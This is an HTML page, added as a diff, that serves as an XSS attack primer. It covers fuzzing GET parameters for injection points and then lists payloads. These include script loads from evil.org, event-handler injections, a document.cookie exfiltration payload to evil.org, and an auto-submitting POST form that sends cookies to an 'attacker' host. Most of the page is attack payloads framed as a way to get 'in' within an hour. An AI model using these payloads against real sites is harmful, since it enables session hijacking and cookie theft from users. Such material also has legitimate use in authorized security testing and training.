@@ -1,0 +1,111 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Mega Primer Testing for XSS</title>
+</head><body>Generic Fuzzing in URLs<br/>
+<br/>
+Typically occurs is GET requests<br/>
+<br/>
+Methodology:<br/>
+Identify variables/injection points<br/>
+Fuzz with known string<br/>
+Filter for known string and note changes<br/>
+Adapt and Overcome<br/>
+<br/>
+<b>Identify</b><br/>
+To fuzz for a XSS vulnerability in a remote file, one has to look for every single variable that the site uses in GET requests for user-input. In other words, we're looking for any of the following two in URLs:<br/>
+?[variable]=[value]<br/>
+or<br/>
+&amp;[variable]=[value]<br/>
+<br/>
+The values to the variables are the important parts.<br/>
+<br/>
+<b>Fuzz with known string</b><br/>
+This time, to scan for XSS, lets reset every [value] for every [variable] to "AAAaaabbCCddD".<br/>
+Search for the string AAAaaabbCCddD, because no one will randomly have that in their source code. If its there, modify the value from AAAaaabbCCddD to:<br/>
+"&gt;'"();&gt;&lt;<br/>
+or<br/>
+'';!--"&lt;CSS_Check&gt;=&amp;{()} &nbsp;<br/>
+<br/>
+and determine how many of these characters make it through.<br/>
+<br/>
+<b>Note changes</b><br/>
+Due to filtering, sometimes these characters (used during attacks) are stripped to their HTML counterparts.<br/>
+<br/>
+If the following signs appear in the affected area of code, one knows that HTML tags can slip through the filter:<br/>
+&lt; &gt;<br/>
+<br/>
+If these following characters slip through, attributes to the tags can be assigned:<br/>
+' "<br/>
+<br/>
+If any of these characters slip through, we know that JavaScript injection is possible:<br/>
+() ;<br/>
+<br/>
+Just scan the ENTIRE site, every single possible request variable and value for a vulnerability, and usually, in less than one hour, you're in.<br/>
+<br/>
+<b>Adapt and overcome</b><br/>
+<br/>
+Scripting tags that are most often used to embed malicious content include &lt;SCRIPT&gt;, &lt;OBJECT&gt;, &lt;APPLET&gt; and &lt;EMBED&gt;.<br/>
+<br/>
+<b>Popular vectors for attack</b><br/>
+<b>Inline Scripting</b><br/>
+http://trusted.org/search.cgi?criteria=&lt;script&gt;code&lt;/script&gt;<br/>
+http://trusted.org/search.cgi?val=&lt;SCRIPT SRC='http://evil.org/badkama.js'&gt; &lt;/SCRIPT&gt;<br/>
+http://trusted.org/COM2.IMG%20src= "Javascript:alert(document.domain)"<br/>
+<br/>
+<b>Forced Error Responses</b><br/>
+http://trusted.org/&lt;script&gt;code&lt;/script&gt; <br/>
+This insertion facet usually occurs due to poor error handling by the web server or application component. The application fails to find the requested page and reports an error which unfortunately includes the unprocessed script data.<br/>
+<br/>
+http://trusted.org/search.cgi?blahblahblahblahblah&lt;script&gt;code&lt;/script&gt; <br/>
+If a Java application such as a servlet fails to handle an error gracefully, and allows stack traces to be sent to the users browser, an attacker can construct a URL that will throw an exception and add his malicious script to the end of the request.<br/>
+<br/>
+http://trusted.og/servlet/ org.apache.catalina.servlets.WebdavStatus/&lt;script&gt;code&lt;/script&gt; <br/>
+In the example above, when the Tomcat servlet is called with the training illegitimate request, an error page is served containing the offending text verbatim.<br/>
+<br/>
+<b>Non &lt;SCRIPT&gt; Events</b><br/>
+" [event]='code' <br/>
+In many cases it may be possible for an attacker to insert an exploit string, with the above syntax, into a HTML tag that should have been like:<br/>
+<br/>
+&lt;A HREF="exploit string"&gt;Go&lt;/A&gt; <br/>
+resulting in: <br/>
+&lt;A HREF="" [event]='code'"&gt;Go&lt;/A&gt;<br/>
+<br/>
+&lt;b onMouseOver="self.location.href='http://evil.org/'"&gt;bolded text&lt;/b&gt; <br/>
+As the client cursor moves over the bolded text, an intrinsic event occurs and the JavaScript code is executed.<br/>
+<br/>
+<b>JavaScript Entities</b><br/>
+&lt;img src="&amp;{alert('CSS Vulnerable')};"&gt; <br/>
+The special character “&amp;” is sometimes interpreted as a new JavaScript code segment (entity).<br/>
+<br/>
+<b>Typical Payloads Formatting</b><br/>
+&lt;img src = "malicious.js"&gt;<br/>
+<br/>
+&lt;script&gt;alert('hacked')&lt;/script&gt;<br/>
+<br/>
+&lt;iframe = "malicious.js"&gt;<br/>
+<br/>
+&lt;script&gt;document.write('&lt;img src="http://evil.org/'+document.cookie+'") &lt;/script&gt;<br/>
+<br/>
+&lt;a href="javascript:…"&gt;click-me&lt;/a&gt;<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+Scripts which are vulnerable to POST insertion are only slightly more difficult to attack. Since POST variables are transmitted independently of the request URI an intermediary page must be used. The goal of the intermediary page is to force the client to execute a POST request containing the jump code. The code below creates a form with the attacker controlled variables set, and then submits it on behalf of the user:<br/>
+<br/>
+&lt;form name=f method=POST action=”http://host/hello.php”&gt;<br/>
+&lt;input type=hidden name=”name”<br/>
+value=”&lt;script&gt;document.location.replace<br/>
+(‘http://attacker/payload?c=’+document.cookie)&lt;/script&gt;”&gt;<br/>
+&lt;/form&gt;<br/>
+&lt;script&gt;f.submit()&lt;/script&gt;<br/>
+<br/>
+<br/>
+</body></html>
